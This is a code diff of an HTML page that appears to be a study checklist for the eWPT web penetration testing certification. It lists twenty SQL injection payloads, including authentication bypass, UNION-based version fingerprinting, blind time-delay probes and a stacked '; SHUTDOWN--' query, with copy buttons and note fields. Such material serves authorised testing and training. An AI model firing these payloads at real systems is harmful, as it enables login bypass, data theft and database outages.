@@ -2,80 +2,126 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SQLi Payload Checklist - eWPT</title>
     <style>
-        body { font-family: sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 20px; }
-        h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; background-color: #161b22; }
-        th, td { padding: 12px; text-align: left; border: 1px solid #30363d; }
-        th { background-color: #0d1117; color: #58a6ff; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 20px; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #58a6ff; padding-bottom: 10px; }
+        h2 { color: #58a6ff; margin: 0; }
+        table { width: 100%; border-collapse: collapse; background-color: #161b22; margin-top: 20px; table-layout: fixed; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; word-wrap: break-word; }
+        th { background-color: #0d1117; color: #58a6ff; position: sticky; top: 0; }
         tr:hover { background-color: #21262d; }
-        .code { font-family: monospace; color: #ffa657; font-size: 1.1em; }
-        button { background: #238636; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
-        button:hover { background: #2ea043; }
-        input[type="text"] { background: #0d1117; border: 1px solid #30363d; color: white; width: 95%; }
+        .payload-code { font-family: 'Courier New', monospace; color: #ffa657; background: #0d1117; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; }
+        button { background-color: #58a6ff; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
+        button:active { background-color: #1f6feb; }
+        .reset-btn { background-color: #f85149; color: white; }
+        input[type="text"] { width: 95%; background: #0d1117; border: 1px solid #30363d; color: #fff; padding: 6px; border-radius: 3px; }
+        .checkbox-col { text-align: center; width: 50px; }
+        .num-col { width: 30px; }
+        .action-col { width: 100px; }
     </style>
 </head>
 <body>
 
-    <h2>🗄️ SQL Injection Checklist</h2>
+    <div class="header-container">
+        <h2>🗄️ SQL Injection Checklist</h2>
+        <button class="reset-btn" onclick="resetForm()">Clear All</button>
+    </div>
+    <p>Live tool for eWPT. Payloads are Base64 encoded in the source to prevent HTML breakage.</p>
 
-    <table>
+    <table id="payloadTable">
         <thead>
             <tr>
-                <th>#</th>
-                <th>Payload</th>
-                <th>Description</th>
-                <th>Action</th>
-                <th>Done</th>
+                <th class="num-col">#</th>
+                <th style="width: 35%;">Payload</th>
+                <th style="width: 25%;">Description</th>
+                <th class="action-col">Action</th>
+                <th class="checkbox-col">Done</th>
                 <th>Notes</th>
             </tr>
         </thead>
-        <tbody id="sqliBody"></tbody>
+        <tbody id="tableBody">
+            <!-- Populated by JavaScript -->
+        </tbody>
     </table>
 
     <script>
         const payloads = [
-            { id: 1, p: "'", d: "Classic Quote: Trigger error" },
-            { id: 2, p: "''", d: "Double Quote: Escape test" },
+            { id: 1, p: "'", d: "Classic Quote: Trigger syntax error" },
+            { id: 2, p: "''", d: "Double Quote: Check for escaping" },
             { id: 3, p: "' OR 1=1--", d: "Auth Bypass (MySQL/MSSQL)" },
             { id: 4, p: '" OR 1=1#', d: "Auth Bypass (Double Quote/#)" },
-            { id: 5, p: "' OR '1'='1", d: "Quote Wrap: No comments" },
-            { id: 6, p: "admin' --", d: "Username Harvest" },
-            { id: 7, p: "' UNION SELECT 1,2,3--", d: "Column Discovery" },
-            { id: 8, p: "' UNION SELECT @@version,NULL,NULL--", d: "Version (MySQL/MSSQL)" },
-            { id: 9, p: "' UNION SELECT NULL,version(),NULL--", d: "Version (Postgres)" },
-            { id: 10, p: "AND 1=1", d: "Boolean True (Blind)" },
-            { id: 11, p: "AND 1=2", d: "Boolean False (Blind)" },
-            { id: 12, p: "SLEEP(5)", d: "Time Delay (MySQL)" },
-            { id: 13, p: "pg_sleep(5)", d: "Time Delay (Postgres)" },
-            { id: 14, p: "WAITFOR DELAY '0:0:5'", d: "Time Delay (MSSQL)" },
-            { id: 15, p: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", d: "Complex Time Bypass" },
-            { id: 16, p: "' OR 1=1 LIMIT 1--", d: "Row Limit Bypass" },
-            { id: 17, p: "ORDER BY 1--", d: "Column Count Discovery" },
-            { id: 18, p: "' HAVING 1=1--", d: "Error-Based Enumeration" },
-            { id: 19, p: "admin' AND 1=(SELECT COUNT(*) FROM users);--", d: "Blind Count Test" },
-            { id: 20, p: "'; SHUTDOWN--", d: "Stacked Query Test" }
+            { id: 5, p: "' OR '1'='1", d: "Quote Wrap: Bypass without comments" },
+            { id: 6, p: "admin' --", d: "Username Harvest: Comment out password" },
+            { id: 7, p: "' UNION SELECT 1,2,3--", d: "Union Based: Column Discovery" },
+            { id: 8, p: "' UNION SELECT @@version,NULL,NULL--", d: "Fingerprinting: MySQL/MSSQL Version" },
+            { id: 9, p: "' UNION SELECT NULL,version(),NULL--", d: "Fingerprinting: Postgres Version" },
+            { id: 10, p: "AND 1=1", d: "Boolean Blind: True statement" },
+            { id: 11, p: "AND 1=2", d: "Boolean Blind: False statement" },
+            { id: 12, p: "SLEEP(5)", d: "Time Based: MySQL Delay" },
+            { id: 13, p: "pg_sleep(5)", d: "Time Based: Postgres Delay" },
+            { id: 14, p: "WAITFOR DELAY '0:0:5'", d: "Time Based: MSSQL Delay" },
+            { id: 15, p: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", d: "Time Based: Bypass filter" },
+            { id: 16, p: "' OR 1=1 LIMIT 1--", d: "Bypass: Prevent multiple row errors" },
+            { id: 17, p: "ORDER BY 1--", d: "Discovery: Determine column count" },
+            { id: 18, p: "' HAVING 1=1--", d: "Error Based: Reveal schema info" },
+            { id: 19, p: "admin' AND 1=(SELECT COUNT(*) FROM users);--", d: "Blind: Data extraction count" },
+            { id: 20, p: "'; SHUTDOWN--", d: "Stacked Queries: MSSQL execution" }
         ];
 
-        const body = document.getElementById('sqliBody');
+        const tableBody = document.getElementById('tableBody');
+
         payloads.forEach(item => {
+            // Encode to Base64 to safely handle quotes and special SQL chars
+            const b64 = btoa(item.p);
+            
             const row = document.createElement('tr');
             row.innerHTML = `
                 <td>${item.id}</td>
-                <td><span class="code">${item.p}</span></td>
+                <td><span class="payload-code">${escapeHTML(item.p)}</span></td>
                 <td>${item.d}</td>
-                <td><button onclick="copyP('${item.p.replace(/'/g, "\\'")}')">Copy</button></td>
-                <td><input type="checkbox"></td>
-                <td><input type="text"></td>
+                <td><button onclick="copyEncoded('${b64}')">Copy</button></td>
+                <td class="checkbox-col"><input type="checkbox" class="task-check"></td>
+                <td><input type="text" class="task-note" placeholder="Database response..."></td>
             `;
-            body.appendChild(row);
+            tableBody.appendChild(row);
         });
 
-        function copyP(txt) {
-            navigator.clipboard.writeText(txt);
-            event.target.innerText = "Done!";
-            setTimeout(() => { event.target.innerText = "Copy"; }, 800);
+        function escapeHTML(str) {
+            return str.replace(/[&<>"']/g, function(m) {
+                return {
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#39;'
+                }[m];
+            });
+        }
+
+        function copyEncoded(b64Data) {
+            const original = atob(b64Data);
+            const btn = event.target;
+            
+            navigator.clipboard.writeText(original).then(() => {
+                const oldText = btn.innerText;
+                btn.innerText = 'Copied!';
+                btn.style.backgroundColor = '#ffffff';
+                btn.style.color = '#000';
+                setTimeout(() => { 
+                    btn.innerText = oldText; 
+                    btn.style.backgroundColor = '#58a6ff';
+                    btn.style.color = '#000';
+                }, 800);
+            });
+        }
+
+        function resetForm() {
+            if(confirm("Clear all SQLi progress?")) {
+                document.querySelectorAll('.task-check').forEach(cb => cb.checked = false);
+                document.querySelectorAll('.task-note').forEach(nt => nt.value = '');
+            }
         }
     </script>
 </body>
